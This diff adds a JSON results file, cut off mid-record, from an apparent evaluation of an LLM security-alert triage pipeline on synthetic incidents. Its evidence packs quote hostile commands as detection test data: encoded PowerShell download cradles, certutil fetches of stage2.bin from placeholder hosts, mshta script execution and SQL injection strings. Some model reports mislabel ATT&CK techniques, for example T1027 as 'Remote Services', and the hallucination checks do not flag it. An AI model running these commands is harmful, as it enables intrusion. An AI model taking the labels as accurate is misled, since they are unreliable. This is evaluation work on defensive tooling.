@@ -1,0 +1,3105 @@
+{
+  "source": "engranaabubakar/Secure_SOC_AI (rule engine + correlator only; triage step replaced by this project's guardrailed pipeline)",
+  "total_tested": 76,
+  "attack_ungrounded_count": 0,
+  "attack_ungrounded_rate": 0.0,
+  "cve_ungrounded_count": 0,
+  "cve_ungrounded_rate": 0.0,
+  "requires_review_count": 0,
+  "requires_review_rate": 0.0,
+  "injection_blocked_count": 0,
+  "results": [
+    {
+      "incident_id": "inc_4b6394fdfe40",
+      "entity": "src_ip:198.51.100.101",
+      "rule_ids": [
+        "AUTH-BRUTE-001"
+      ],
+      "ground_truth_mitre": [
+        "T1110"
+      ],
+      "report": {
+        "alert_id": "inc_4b6394fdfe40",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A high-severity alert has been triggered due to brute-force logon attempts originating from IP address 198.51.100.101. This activity is likely an attempt to gain unauthorized access to a system.",
+        "threat_type": "Password Cracking",
+        "recommended_action": "Block the source IP address 198.51.100.101 and investigate the system for potential vulnerabilities.",
+        "confidence_score": 0.9,
+        "reasoning": "The alert indicates a high-severity brute-force logon attempt, which is a common technique used by attackers to gain unauthorized access. The presence of MITRE ATT&CK technique T1110 further supports this assessment.",
+        "processed_at": "2026-08-07T19:16:44.702995",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "198.51.100.101"
+          ],
+          "hosts": [],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[HIGH] Brute-force logon attempts on src_ip:198.51.100.101. Detections: Brute-force logon attempts. MITRE ATT&CK techniques tagged by detector: T1110."
+        }
+      }
+    },
+    {
+      "incident_id": "inc_62e05c9f5c4d",
+      "entity": "host:ws-mktg-09",
+      "rule_ids": [
+        "PROC-ENC-PS-001"
+      ],
+      "ground_truth_mitre": [
+        "T1027",
+        "T1059.001"
+      ],
+      "report": {
+        "alert_id": "inc_62e05c9f5c4d",
+        "severity_assessment": "CRITICAL",
+        "threat_summary": "A critical alert has been triggered on host ws-mktg-09 due to the detection of an encoded PowerShell command. This suggests a potential malicious activity.",
+        "threat_type": "Lateral Movement",
+        "recommended_action": "Investigate the host ws-mktg-09 for signs of compromise and isolate it from the network to prevent further potential damage.",
+        "confidence_score": 0.95,
+        "reasoning": "The presence of an encoded PowerShell command, along with the detection of MITRE ATT&CK techniques T1027 and T1059.001, indicates a high likelihood of a malicious activity. The unknown source IP and protocol further support the critical severity of this alert.",
+        "processed_at": "2026-08-07T19:16:45.082817",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [],
+          "hosts": [
+            "ws-mktg-09"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[CRITICAL] Encoded PowerShell command on host:ws-mktg-09. Detections: Encoded PowerShell command. MITRE ATT&CK techniques tagged by detector: T1027, T1059.001. [ws-mktg-09] powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAwAC4AMgAuADUAMQAvAHgALgBwAHMAMQAnACkA"
+        }
+      }
+    },
+    {
+      "incident_id": "inc_c2e3bbdf5de8",
+      "entity": "host:ws-dev-14",
+      "rule_ids": [
+        "PROC-LOLBIN-001"
+      ],
+      "ground_truth_mitre": [
+        "T1218"
+      ],
+      "report": {
+        "alert_id": "inc_c2e3bbdf5de8",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A high-severity alert has been triggered on host ws-dev-14 due to Living-off-the-land binary abuse, indicating potential malicious activity.",
+        "threat_type": "Lateral Movement",
+        "recommended_action": "Investigate the host ws-dev-14 for signs of compromise and review the certutil.exe usage to determine the source of the payload.",
+        "confidence_score": 0.85,
+        "reasoning": "The presence of Living-off-the-land binary abuse, specifically the use of certutil.exe to decode a payload, suggests a potential attempt to execute malicious code on the host. The MITRE ATT&CK technique T1218 is also tagged, indicating a known tactic used by attackers.",
+        "processed_at": "2026-08-07T19:16:45.483506",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [],
+          "hosts": [
+            "ws-dev-14"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[HIGH] Living-off-the-land binary abuse on host:ws-dev-14. Detections: Living-off-the-land binary abuse. MITRE ATT&CK techniques tagged by detector: T1218. [ws-dev-14] certutil.exe -decode C:\\Users\\Public\\payload.txt payload.exe"
+        }
+      }
+    },
+    {
+      "incident_id": "inc_1293c3b1422d",
+      "entity": "host:hr-portal-06",
+      "rule_ids": [
+        "PROC-ENC-PS-001"
+      ],
+      "ground_truth_mitre": [
+        "T1027",
+        "T1059.001"
+      ],
+      "report": {
+        "alert_id": "inc_1293c3b1422d",
+        "severity_assessment": "CRITICAL",
+        "threat_summary": "A critical alert has been triggered on the hr-portal-06 host due to the detection of an encoded PowerShell command. This suggests a potential malicious activity.",
+        "threat_type": "Lateral Movement/Execution",
+        "recommended_action": "Investigate the hr-portal-06 host for signs of malicious activity and potential lateral movement. Review system logs and network traffic for any suspicious activity.",
+        "confidence_score": 0.95,
+        "reasoning": "The presence of an encoded PowerShell command, along with the detection of MITRE ATT&CK techniques T1027 (Remote Services) and T1059.001 (Command and Scripting Interpreter), indicates a high likelihood of malicious activity. The unknown source IP and protocol further support the critical severity assessment.",
+        "processed_at": "2026-08-07T19:16:45.884869",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [],
+          "hosts": [
+            "hr-portal-06"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[CRITICAL] Encoded PowerShell command on host:hr-portal-06. Detections: Encoded PowerShell command. MITRE ATT&CK techniques tagged by detector: T1027, T1059.001. [hr-portal-06] powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAwAC4AMgAuADUAMwAvAHgALgBwAHMAMQAnACkA"
+        }
+      }
+    },
+    {
+      "incident_id": "inc_b0cf8d6903e9",
+      "entity": "host:ws-mktg-04",
+      "rule_ids": [
+        "NET-C2-PORT-001",
+        "NET-EXFIL-001",
+        "PROC-ENC-PS-001",
+        "PROC-LOLBIN-001"
+      ],
+      "ground_truth_mitre": [
+        "T1027",
+        "T1048",
+        "T1059.001",
+        "T1218",
+        "T1571"
+      ],
+      "report": {
+        "alert_id": "inc_b0cf8d6903e9",
+        "severity_assessment": "CRITICAL",
+        "threat_summary": "A critical threat has been detected on host ws-mktg-04, where an encoded PowerShell command was executed, and a connection was made to a known C2-associated port. This indicates potential Living-off-the-land binary abuse and a large outbound transfer to an external host.",
+        "threat_type": "Lateral Movement and Command and Control",
+        "recommended_action": "Immediately isolate the host ws-mktg-04 from the network and initiate a thorough forensic analysis to determine the extent of the compromise.",
+        "confidence_score": 0.95,
+        "reasoning": "The presence of encoded PowerShell commands, a connection to a known C2-associated port, and large outbound transfers to an external host are all indicators of a sophisticated threat. The combination of these indicators, along with the detection of Living-off-the-land binary abuse, suggests a high confidence in the threat assessment.",
+        "processed_at": "2026-08-07T19:16:46.318687",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "192.0.2.153"
+          ],
+          "hosts": [
+            "ws-mktg-04"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [
+            "4444"
+          ],
+          "text": "[CRITICAL] Encoded PowerShell command on host:ws-mktg-04. Detections: Connection to known C2-associated port, Encoded PowerShell command, Large outbound transfer to external host, Living-off-the-land binary abuse. MITRE ATT&CK techniques tagged by detector: T1027, T1048, T1059.001, T1218, T1571. [ws-mktg-04] powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAwAC4AMgAuADEANQAzAC8AeAAuAHAAcwAxACcAKQA=; [ws-mktg-04] certutil.exe -urlcache -split -f http://192.0.2.153/stage2.bin s2.bin"
+        }
+      }
+    },
+    {
+      "incident_id": "inc_a25e1bc4f181",
+      "entity": "host:backup-srv-01",
+      "rule_ids": [
+        "NET-C2-PORT-001",
+        "NET-EXFIL-001",
+        "PROC-ENC-PS-001",
+        "PROC-LOLBIN-001"
+      ],
+      "ground_truth_mitre": [
+        "T1027",
+        "T1048",
+        "T1059.001",
+        "T1218",
+        "T1571"
+      ],
+      "report": {
+        "alert_id": "inc_a25e1bc4f181",
+        "severity_assessment": "CRITICAL",
+        "threat_summary": "A critical threat has been detected on the host backup-srv-01, where an encoded PowerShell command was executed, indicating potential Living-off-the-land binary abuse and a connection to a known C2-associated port.",
+        "threat_type": "Lateral Movement and Command and Control",
+        "recommended_action": "Immediately isolate the host backup-srv-01 from the network and initiate a thorough forensic analysis to determine the extent of the compromise.",
+        "confidence_score": 0.95,
+        "reasoning": "The presence of encoded PowerShell commands, a connection to a known C2-associated port, and Living-off-the-land binary abuse are all indicators of a sophisticated threat. The combination of these indicators and the execution of a large outbound transfer to an external host further supports the severity of this threat.",
+        "processed_at": "2026-08-07T19:16:46.787440",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "192.0.2.80"
+          ],
+          "hosts": [
+            "backup-srv-01"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [
+            "31337"
+          ],
+          "text": "[CRITICAL] Encoded PowerShell command on host:backup-srv-01. Detections: Connection to known C2-associated port, Encoded PowerShell command, Large outbound transfer to external host, Living-off-the-land binary abuse. MITRE ATT&CK techniques tagged by detector: T1027, T1048, T1059.001, T1218, T1571. [backup-srv-01] powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAwAC4AMgAuADgAMAAvAHgALgBwAHMAMQAnACkA; [backup-srv-01] certutil.exe -urlcache -split -f http://192.0.2.80/stage2.bin s2.bin"
+        }
+      }
+    },
+    {
+      "incident_id": "inc_56484f7b8d38",
+      "entity": "host:vpn-gw-01",
+      "rule_ids": [
+        "NET-EXFIL-001"
+      ],
+      "ground_truth_mitre": [
+        "T1048"
+      ],
+      "report": {
+        "alert_id": "inc_56484f7b8d38",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A large outbound transfer to an external host was detected on the VPN gateway host vpn-gw-01, indicating potential data exfiltration.",
+        "threat_type": "Data Exfiltration",
+        "recommended_action": "Investigate the VPN gateway host vpn-gw-01 for signs of unauthorized access or malicious activity, and review the network traffic to identify the source of the large transfer.",
+        "confidence_score": 0.8,
+        "reasoning": "The detection of a large outbound transfer to an external host on a VPN gateway host is a strong indicator of potential data exfiltration, and the tagging of MITRE ATT&CK technique T1048 further supports this assessment.",
+        "processed_at": "2026-08-07T19:16:47.166180",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "192.0.2.166"
+          ],
+          "hosts": [
+            "vpn-gw-01"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [
+            "443"
+          ],
+          "text": "[HIGH] Large outbound transfer to external host on host:vpn-gw-01. Detections: Large outbound transfer to external host. MITRE ATT&CK techniques tagged by detector: T1048."
+        }
+      }
+    },
+    {
+      "incident_id": "inc_87675c893376",
+      "entity": "src_ip:203.0.113.40",
+      "rule_ids": [
+        "WEB-SQLI-001"
+      ],
+      "ground_truth_mitre": [
+        "T1190"
+      ],
+      "report": {
+        "alert_id": "inc_87675c893376",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A potential SQL injection attack has been detected on a web request from IP address 203.0.113.40, attempting to exploit a vulnerability in a web application.",
+        "threat_type": "Web Application Attack",
+        "recommended_action": "Investigate the source IP address 203.0.113.40 and review web application logs for potential SQL injection attempts.",
+        "confidence_score": 0.85,
+        "reasoning": "The detection of a SQL injection pattern in a web request, coupled with the identification of MITRE ATT&CK technique T1190, suggests a malicious intent to exploit a web application vulnerability.",
+        "processed_at": "2026-08-07T19:16:47.488263",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "203.0.113.40"
+          ],
+          "hosts": [],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[HIGH] SQL injection pattern in web request on src_ip:203.0.113.40. Detections: SQL injection pattern in web request. MITRE ATT&CK techniques tagged by detector: T1190. [ws-dev-05] GET /product.php?id=1' AND SLEEP(5)--"
+        }
+      }
+    },
+    {
+      "incident_id": "inc_3774567311d4",
+      "entity": "host:api-gw-01",
+      "rule_ids": [
+        "PROC-LOLBIN-001"
+      ],
+      "ground_truth_mitre": [
+        "T1218"
+      ],
+      "report": {
+        "alert_id": "inc_3774567311d4",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A high-severity alert has been triggered on the api-gw-01 host due to Living-off-the-land binary abuse, indicating potential malicious activity.",
+        "threat_type": "Lateral Movement",
+        "recommended_action": "Investigate the api-gw-01 host for signs of compromise and review system logs for any suspicious activity.",
+        "confidence_score": 0.85,
+        "reasoning": "The presence of T1218 (Signed Binary Proxy Execution) MITRE ATT&CK technique, combined with the use of mshta.exe to execute a malicious script, suggests a high likelihood of a targeted attack.",
+        "processed_at": "2026-08-07T19:16:47.846753",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [],
+          "hosts": [
+            "api-gw-01"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[HIGH] Living-off-the-land binary abuse on host:api-gw-01. Detections: Living-off-the-land binary abuse. MITRE ATT&CK techniques tagged by detector: T1218. [api-gw-01] mshta.exe javascript:eval(\"var x=new ActiveXObject('WScript.Shell');x.Run('calc.exe')\")"
+        }
+      }
+    },
+    {
+      "incident_id": "inc_9303db186755",
+      "entity": "src_ip:198.51.100.142",
+      "rule_ids": [
+        "WEB-SQLI-001"
+      ],
+      "ground_truth_mitre": [
+        "T1190"
+      ],
+      "report": {
+        "alert_id": "inc_9303db186755",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A potential SQL injection attack has been detected on a web request from IP address 198.51.100.142, targeting a web application.",
+        "threat_type": "Web Application Attack",
+        "recommended_action": "Investigate the web application and review logs for any potential vulnerabilities or malicious activity.",
+        "confidence_score": 0.85,
+        "reasoning": "The detection of a SQL injection pattern in a web request is a strong indicator of a potential attack, and the presence of the MITRE ATT&CK technique T1190 further supports this assessment.",
+        "processed_at": "2026-08-07T19:16:48.152678",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "198.51.100.142"
+          ],
+          "hosts": [],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[HIGH] SQL injection pattern in web request on src_ip:198.51.100.142. Detections: SQL injection pattern in web request. MITRE ATT&CK techniques tagged by detector: T1190. [hr-portal-04] GET /report.php?id=-1' UNION SELECT NULL,NULL,NULL--"
+        }
+      }
+    },
+    {
+      "incident_id": "inc_0be2221aaf0e",
+      "entity": "src_ip:203.0.113.200",
+      "rule_ids": [
+        "AUTH-SPRAY-001"
+      ],
+      "ground_truth_mitre": [
+        "T1110.003"
+      ],
+      "report": {
+        "alert_id": "inc_0be2221aaf0e",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A high-severity password spraying attack has been detected originating from IP address 203.0.113.200, targeting multiple accounts.",
+        "threat_type": "Password Spraying",
+        "recommended_action": "Block the source IP address 203.0.113.200 and investigate the affected accounts for potential unauthorized access.",
+        "confidence_score": 0.95,
+        "reasoning": "The alert indicates password spraying across accounts, which is a known MITRE ATT&CK technique (T1110.003). This suggests a targeted attack attempting to gain unauthorized access to multiple accounts.",
+        "processed_at": "2026-08-07T19:16:52.517767",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "203.0.113.200"
+          ],
+          "hosts": [],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[HIGH] Password spraying across accounts on src_ip:203.0.113.200. Detections: Password spraying across accounts. MITRE ATT&CK techniques tagged by detector: T1110.003."
+        }
+      }
+    },
+    {
+      "incident_id": "inc_c37a96a358f9",
+      "entity": "host:ws-dev-13",
+      "rule_ids": [
+        "NET-C2-PORT-001"
+      ],
+      "ground_truth_mitre": [
+        "T1571"
+      ],
+      "report": {
+        "alert_id": "inc_c37a96a358f9",
+        "severity_assessment": "MEDIUM",
+        "threat_summary": "A potential command and control (C2) communication has been detected on host ws-dev-13, with a connection to a known C2-associated port 1337.",
+        "threat_type": "Command and Control (C2) activity",
+        "recommended_action": "Investigate the host ws-dev-13 for signs of malware or unauthorized access, and review network traffic for similar connections.",
+        "confidence_score": 0.8,
+        "reasoning": "The detection of a connection to a known C2-associated port, along with the presence of MITRE ATT&CK technique T1571, suggests a potential C2 communication. However, the unknown protocol and lack of payload snippet reduce the confidence score.",
+        "processed_at": "2026-08-07T19:16:57.926439",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "192.0.2.82"
+          ],
+          "hosts": [
+            "ws-dev-13"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [
+            "1337"
+          ],
+          "text": "[MEDIUM] Connection to known C2-associated port on host:ws-dev-13. Detections: Connection to known C2-associated port. MITRE ATT&CK techniques tagged by detector: T1571."
+        }
+      }
+    },
+    {
+      "incident_id": "inc_88509aee109f",
+      "entity": "host:ws-mktg-01",
+      "rule_ids": [
+        "NET-C2-PORT-001"
+      ],
+      "ground_truth_mitre": [
+        "T1571"
+      ],
+      "report": {
+        "alert_id": "inc_88509aee109f",
+        "severity_assessment": "MEDIUM",
+        "threat_summary": "A potential command and control (C2) communication has been detected on the host ws-mktg-01, with a connection to a known C2-associated port 6666.",
+        "threat_type": "Command and Control (C2) activity",
+        "recommended_action": "Investigate the host ws-mktg-01 for signs of malware or unauthorized access, and review network traffic for similar connections.",
+        "confidence_score": 0.8,
+        "reasoning": "The detection of a connection to a known C2-associated port, along with the presence of MITRE ATT&CK technique T1571, suggests a potential C2 communication. However, the unknown protocol and lack of payload snippet reduce the confidence score.",
+        "processed_at": "2026-08-07T19:17:03.346714",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "192.0.2.231"
+          ],
+          "hosts": [
+            "ws-mktg-01"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [
+            "6666"
+          ],
+          "text": "[MEDIUM] Connection to known C2-associated port on host:ws-mktg-01. Detections: Connection to known C2-associated port. MITRE ATT&CK techniques tagged by detector: T1571."
+        }
+      }
+    },
+    {
+      "incident_id": "inc_b03d7cb7729f",
+      "entity": "src_ip:198.51.100.189",
+      "rule_ids": [
+        "AUTH-BRUTE-001"
+      ],
+      "ground_truth_mitre": [
+        "T1110"
+      ],
+      "report": {
+        "alert_id": "inc_b03d7cb7729f",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A high-severity alert has been triggered due to brute-force logon attempts originating from the source IP 198.51.100.189. This activity is likely an attempt to gain unauthorized access to a system.",
+        "threat_type": "Password Cracking",
+        "recommended_action": "Investigate the source IP 198.51.100.189 and block it to prevent further attempts. Review system logs for potential vulnerabilities.",
+        "confidence_score": 0.9,
+        "reasoning": "The alert indicates a high-severity brute-force logon attempt, which is a common tactic used by attackers to gain unauthorized access. The presence of MITRE ATT&CK technique T1110 further supports this assessment.",
+        "processed_at": "2026-08-07T19:17:08.826197",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "198.51.100.189"
+          ],
+          "hosts": [],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[HIGH] Brute-force logon attempts on src_ip:198.51.100.189. Detections: Brute-force logon attempts. MITRE ATT&CK techniques tagged by detector: T1110."
+        }
+      }
+    },
+    {
+      "incident_id": "inc_cda6649f1096",
+      "entity": "host:backup-srv-03",
+      "rule_ids": [
+        "PROC-LOLBIN-001"
+      ],
+      "ground_truth_mitre": [
+        "T1218"
+      ],
+      "report": {
+        "alert_id": "inc_cda6649f1096",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A high-severity alert has been triggered on the backup-srv-03 host due to Living-off-the-land binary abuse, indicating potential malicious activity.",
+        "threat_type": "Lateral Movement",
+        "recommended_action": "Investigate the backup-srv-03 host for signs of compromise and review system logs for any suspicious activity.",
+        "confidence_score": 0.85,
+        "reasoning": "The detection of Living-off-the-land binary abuse on the backup-srv-03 host, specifically the use of mshta.exe to execute a malicious script, suggests a potential threat. The presence of T1218 (Signed Binary Proxy Execution) MITRE ATT&CK technique further supports this assessment.",
+        "processed_at": "2026-08-07T19:17:14.281703",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [],
+          "hosts": [
+            "backup-srv-03"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[HIGH] Living-off-the-land binary abuse on host:backup-srv-03. Detections: Living-off-the-land binary abuse. MITRE ATT&CK techniques tagged by detector: T1218. [backup-srv-03] mshta.exe javascript:eval(\"var x=new ActiveXObject('WScript.Shell');x.Run('calc.exe')\")"
+        }
+      }
+    },
+    {
+      "incident_id": "inc_a8aca441c54f",
+      "entity": "host:ws-dev-04",
+      "rule_ids": [
+        "PROC-ENC-PS-001"
+      ],
+      "ground_truth_mitre": [
+        "T1027",
+        "T1059.001"
+      ],
+      "report": {
+        "alert_id": "inc_a8aca441c54f",
+        "severity_assessment": "CRITICAL",
+        "threat_summary": "A critical alert has been triggered on the ws-dev-04 host due to the detection of an encoded PowerShell command. This suggests a potential PowerShell-based attack.",
+        "threat_type": "Lateral Movement/Execution",
+        "recommended_action": "Investigate the ws-dev-04 host for signs of malicious activity and potential lateral movement. Review system logs and network traffic for any suspicious activity.",
+        "confidence_score": 0.95,
+        "reasoning": "The presence of an encoded PowerShell command on the ws-dev-04 host, along with the detection of MITRE ATT&CK techniques T1027 and T1059.001, indicates a high likelihood of a PowerShell-based attack. The unknown source IP and destination IP further suggest that this may be an internal lateral movement attempt.",
+        "processed_at": "2026-08-07T19:17:20.808438",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [],
+          "hosts": [
+            "ws-dev-04"
+          ],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[CRITICAL] Encoded PowerShell command on host:ws-dev-04. Detections: Encoded PowerShell command. MITRE ATT&CK techniques tagged by detector: T1027, T1059.001. [ws-dev-04] powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAwAC4AMgAuADYAOQAvAHgALgBwAHMAMQAnACkA"
+        }
+      }
+    },
+    {
+      "incident_id": "inc_8b04a41ac67b",
+      "entity": "src_ip:203.0.113.120",
+      "rule_ids": [
+        "AUTH-BRUTE-001"
+      ],
+      "ground_truth_mitre": [
+        "T1110"
+      ],
+      "report": {
+        "alert_id": "inc_8b04a41ac67b",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A high-severity alert has been triggered due to brute-force logon attempts originating from IP address 203.0.113.120. This may indicate an attempt to gain unauthorized access to a system or network.",
+        "threat_type": "Password Cracking",
+        "recommended_action": "Block the source IP address 203.0.113.120 and investigate the system or network for potential vulnerabilities.",
+        "confidence_score": 0.9,
+        "reasoning": "The presence of MITRE ATT&CK technique T1110 (Brute Force) tagged by the detector indicates a known tactic used in password cracking attacks. The high severity of the alert and the lack of additional context suggest a potential security threat.",
+        "processed_at": "2026-08-07T19:17:26.286561",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
+        "guardrail_blocked": false,
+        "hallucinated_cves": [],
+        "cve_verifications": [],
+        "hallucinated_attack_techniques": [],
+        "attack_technique_verifications": [],
+        "output_guardrail_flagged": false,
+        "requires_review": false,
+        "evidence_pack": {
+          "ips": [
+            "203.0.113.120"
+          ],
+          "hosts": [],
+          "users": [],
+          "hashes": [],
+          "ports": [],
+          "text": "[HIGH] Brute-force logon attempts on src_ip:203.0.113.120. Detections: Brute-force logon attempts. MITRE ATT&CK techniques tagged by detector: T1110."
+        }
+      }
+    },
+    {
+      "incident_id": "inc_1d1d6ebccdd6",
+      "entity": "host:ws-dev-09",
+      "rule_ids": [
+        "PROC-LOLBIN-001"
+      ],
+      "ground_truth_mitre": [
+        "T1218"
+      ],
+      "report": {
+        "alert_id": "inc_1d1d6ebccdd6",
+        "severity_assessment": "HIGH",
+        "threat_summary": "A high-severity alert has been triggered on host ws-dev-09 due to Living-off-the-land binary abuse, indicating potential malicious activity.",
+        "threat_type": "Lateral Movement",
+        "recommended_action": "Investigate the host ws-dev-09 for signs of compromise and review system logs for further information.",
+        "confidence_score": 0.85,
+        "reasoning": "The presence of T1218 (Signed Binary Proxy Execution) MITRE ATT&CK technique, combined with the use of rundll32.exe and ActiveXObject, suggests a potential attempt to execute malicious code on the host.",
+        "processed_at": "2026-08-07T19:17:32.748730",
+        "model": "llama-3.1-8b-instant",
+        "agent_version": "guardrail-v0.4",
